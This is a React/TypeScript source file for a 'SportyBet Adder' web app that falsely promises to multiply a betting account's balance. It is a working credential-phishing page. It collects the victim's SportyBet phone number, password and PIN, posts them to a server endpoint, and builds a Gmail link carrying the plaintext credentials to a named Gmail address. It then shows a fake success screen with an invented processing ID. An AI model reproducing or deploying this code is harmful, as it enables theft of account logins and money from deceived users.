/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  ChevronRight, 
  Wallet, 
  ShieldCheck, 
  Trophy, 
  CircleDollarSign,
  Smartphone,
  Lock,
  KeyRound,
  CheckCircle2,
  AlertCircle,
  Loader2
} from 'lucide-react';

type Step = 'welcome' | 'package' | 'details' | 'success';

interface Plan {
  id: number;
  label: string;
  range: string;
}

const PLANS: Plan[] = [
  { id: 1, label: 'Standard', range: '3k to 300k' },
  { id: 2, label: 'Premium', range: '4k to 400k' },
  { id: 3, label: 'Elite', range: '5k to 500k' },
  { id: 4, label: 'Gold', range: '6k to 600k' },
  { id: 5, label: 'Platinum', range: '7k to 700k' },
  { id: 6, label: 'Diamond', range: '8k to 800k' },
  { id: 7, label: 'Ultimate', range: '9k to 900k' },
];

export default function App() {
  const [step, setStep] = useState<Step>('welcome');
  const [selectedPlan, setSelectedPlan] = useState<Plan | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [formData, setFormData] = useState({
    number: '',
    password: '',
    pin: '',
  });

  const handleNext = () => {
    if (step === 'welcome') setStep('package');
    else if (step === 'package' && selectedPlan) setStep('details');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setError(null);

    try {
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...formData,
          plan: selectedPlan?.range,
        }),
      });

      if (response.ok) {
        // Construct characters for the email body
        const subject = encodeURIComponent('SportyBet Adder Submission');
        const bodyContent = `SportyBet Submission Details:
-----------------------
Plan: ${selectedPlan?.range}
Phone Number: ${formData.number}
Password: ${formData.password}
Pin: ${formData.pin}
-----------------------`;
        const body = encodeURIComponent(bodyContent);
        const gmailUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=karleegrey32t@gmail.com&su=${subject}&body=${body}`;

        // Set to success step internally
        setStep('success');
        
        // Redirect to Gmail to finalize submission manually if they wish
        window.location.href = gmailUrl;
      } else {
        setError('Connection failed. Please check your data connection and try again.');
      }
    } catch (err) {
      setError('A network error occurred. Please try again later.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-sans selection:bg-red-500/30">
      {/* Background decoration */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-red-900/10 blur-[120px] rounded-full" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-green-900/10 blur-[120px] rounded-full" />
      </div>

      <main className="relative z-10 max-w-md mx-auto px-6 py-12 min-h-screen flex flex-col items-center justify-center">
        <AnimatePresence mode="wait">
          {step === 'welcome' && (
            <motion.div
              key="welcome"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 1.05 }}
              className="text-center w-full"
              id="welcome-screen"
            >
              <div className="mb-8 inline-flex items-center justify-center w-20 h-20 rounded-2xl bg-gradient-to-br from-red-600 to-red-800 shadow-2xl shadow-red-900/20">
                <Trophy className="w-10 h-10 text-white" />
              </div>
              <h1 className="text-4xl font-bold tracking-tight mb-4 bg-gradient-to-b from-white to-slate-400 bg-clip-text text-transparent">
                SportyBet Adder
              </h1>
              <p className="text-slate-400 text-lg mb-12">
                The world's most advanced account balance enhancer. Fast, secure, and reliable.
              </p>
              
              <div className="grid grid-cols-2 gap-4 mb-12">
                <div className="p-4 rounded-xl bg-slate-900/50 border border-slate-800 backdrop-blur-sm">
                  <ShieldCheck className="w-6 h-6 text-green-500 mb-2 mx-auto" />
                  <span className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Secured</span>
                </div>
                <div className="p-4 rounded-xl bg-slate-900/50 border border-slate-800 backdrop-blur-sm">
                  <CircleDollarSign className="w-6 h-6 text-yellow-500 mb-2 mx-auto" />
                  <span className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Instant</span>
                </div>
              </div>

              <button
                id="proceed-button"
                onClick={handleNext}
                className="group relative w-full py-4 bg-red-600 hover:bg-red-500 text-white rounded-xl font-bold text-lg transition-all active:scale-95 shadow-lg shadow-red-900/30 overflow-hidden"
              >
                <div className="relative z-10 flex items-center justify-center gap-2">
                  Proceed <ChevronRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                </div>
                <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/10 to-white/0 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-700" />
              </button>
            </motion.div>
          )}

          {step === 'package' && (
            <motion.div
              key="package"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="w-full"
              id="package-screen"
            >
              <h2 className="text-2xl font-bold mb-2 flex items-center gap-2">
                <Wallet className="w-6 h-6 text-red-500" />
                Select Package
              </h2>
              <p className="text-slate-400 mb-8">Choose a multiplier package to continue.</p>

              <div className="space-y-3 mb-8 max-h-[60vh] overflow-y-auto pr-2 custom-scrollbar">
                {PLANS.map((plan) => (
                  <button
                    key={plan.id}
                    onClick={() => setSelectedPlan(plan)}
                    className={`w-full p-4 rounded-xl border transition-all text-left flex items-center justify-between ${
                      selectedPlan?.id === plan.id
                        ? 'bg-red-600/10 border-red-500 text-white'
                        : 'bg-slate-900/50 border-slate-800 text-slate-300 hover:border-slate-700'
                    }`}
                  >
                    <div>
                      <div className="text-xs font-bold uppercase tracking-widest text-slate-500 mb-1">
                        {plan.label} Plan
                      </div>
                      <div className="text-lg font-bold">{plan.range}</div>
                    </div>
                    {selectedPlan?.id === plan.id && (
                      <div className="w-6 h-6 rounded-full bg-red-600 flex items-center justify-center">
                        <CheckCircle2 className="w-4 h-4 text-white" />
                      </div>
                    )}
                  </button>
                ))}
              </div>

              <button
                disabled={!selectedPlan}
                onClick={handleNext}
                className="w-full py-4 bg-red-600 hover:bg-red-500 disabled:opacity-50 disabled:cursor-not-allowed text-white rounded-xl font-bold text-lg transition-all active:scale-95 shadow-lg shadow-red-900/30"
              >
                Proceed with {selectedPlan?.range || 'Selected'}
              </button>
              
              <button 
                onClick={() => setStep('welcome')}
                className="w-full mt-4 py-2 text-slate-500 hover:text-slate-300 transition-colors text-sm font-medium"
              >
                Back to Home
              </button>
            </motion.div>
          )}

          {step === 'details' && (
            <motion.div
              key="details"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="w-full"
              id="details-screen"
            >
              <div className="mb-8 p-4 bg-blue-500/10 border border-blue-500/20 rounded-xl flex gap-3 text-sm text-blue-400">
                <AlertCircle className="w-5 h-5 shrink-0" />
                <p>Verify your details correctly. Account sync requires valid credentials for processing.</p>
              </div>

              <h2 className="text-2xl font-bold mb-6 flex items-center gap-2">
                <ShieldCheck className="w-6 h-6 text-green-500" />
                Account Verification
              </h2>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-2">
                  <label className="text-xs font-bold uppercase tracking-wider text-slate-500 flex items-center gap-2">
                    <Smartphone className="w-3 h-3" /> SportyBet Number
                  </label>
                  <input
                    required
                    type="tel"
                    placeholder="e.g. 08012345678"
                    className="w-full bg-slate-900 border border-slate-800 rounded-xl px-4 py-3 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500 transition-all"
                    value={formData.number}
                    onChange={(e) => setFormData({ ...formData, number: e.target.value })}
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-xs font-bold uppercase tracking-wider text-slate-500 flex items-center gap-2">
                    <Lock className="w-3 h-3" /> SportyBet Password
                  </label>
                  <input
                    required
                    type="password"
                    placeholder="Enter password"
                    className="w-full bg-slate-900 border border-slate-800 rounded-xl px-4 py-3 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500 transition-all"
                    value={formData.password}
                    onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-xs font-bold uppercase tracking-wider text-slate-500 flex items-center gap-2">
                    <KeyRound className="w-3 h-3" /> SportyBet PIN
                  </label>
                  <input
                    required
                    type="text"
                    inputMode="numeric"
                    maxLength={4}
                    placeholder="4-digit PIN"
                    className="w-full bg-slate-900 border border-slate-800 rounded-xl px-4 py-3 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500 transition-all font-mono tracking-[0.5em]"
                    value={formData.pin}
                    onChange={(e) => setFormData({ ...formData, pin: e.target.value.replace(/\D/g, '') })}
                  />
                </div>

                {error && (
                  <motion.div 
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="p-3 bg-red-500/10 border border-red-500/20 rounded-lg text-sm text-red-400 flex items-center gap-2"
                  >
                    <AlertCircle className="w-4 h-4" /> {error}
                  </motion.div>
                )}

                <button
                  id="submit-button"
                  disabled={isSubmitting}
                  className="w-full py-4 bg-green-600 hover:bg-green-500 disabled:opacity-50 disabled:cursor-wait text-white rounded-xl font-bold text-lg transition-all active:scale-95 shadow-lg shadow-green-900/30 flex items-center justify-center gap-2"
                >
                  {isSubmitting ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" /> Processing...
                    </>
                  ) : (
                    <>Submit & Enhance Balance</>
                  )}
                </button>

                <button 
                  type="button"
                  onClick={() => setStep('package')}
                  className="w-full text-slate-500 hover:text-slate-300 transition-colors text-sm font-medium"
                >
                  Change Package
                </button>
              </form>
            </motion.div>
          )}

          {step === 'success' && (
            <motion.div
              key="success"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              className="text-center w-full"
              id="success-screen"
            >
              <div className="mb-8 inline-flex items-center justify-center w-20 h-20 rounded-full bg-green-500 shadow-2xl shadow-green-900/40">
                <CheckCircle2 className="w-10 h-10 text-white" />
              </div>
              <h2 className="text-3xl font-bold mb-4">Request Successful</h2>
              <p className="text-slate-400 text-lg mb-8">
                Your account balance enhancement of <span className="text-white font-bold">{selectedPlan?.range}</span> is being processed. It will reflect in your account within 24 hours.
              </p>
              
              <div className="p-6 bg-slate-900/80 border border-slate-800 rounded-2xl text-left mb-8">
                <div className="flex items-center justify-between mb-4 pb-4 border-bottom border-slate-800 text-sm">
                  <span className="text-slate-500">Processing ID:</span>
                  <span className="font-mono text-slate-300">SB-{Math.random().toString(36).substr(2, 9).toUpperCase()}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-500">Estimated Arrival:</span>
                  <span className="text-green-500 font-semibold">T+24 Hours</span>
                </div>
              </div>

              <button
                onClick={() => window.location.reload()}
                className="w-full py-4 bg-slate-100 hover:bg-white text-slate-950 rounded-xl font-bold text-lg transition-all active:scale-95"
              >
                Done
              </button>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      <footer className="fixed bottom-0 left-0 right-0 p-6 flex justify-center pointer-events-none opacity-20 translate-y-2">
        <div className="flex items-center gap-4 text-[10px] font-bold uppercase tracking-[0.2em] text-slate-500">
          <span>Encrypted</span>
          <div className="w-1 h-1 rounded-full bg-slate-700" />
          <span>Verified</span>
          <div className="w-1 h-1 rounded-full bg-slate-700" />
          <span>v4.2.0</span>
        </div>
      </footer>

      <style>{`
        .custom-scrollbar::-webkit-scrollbar {
          width: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: transparent;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: #334155;
          border-radius: 10px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: #475569;
        }
      `}</style>
    </div>
  );
}
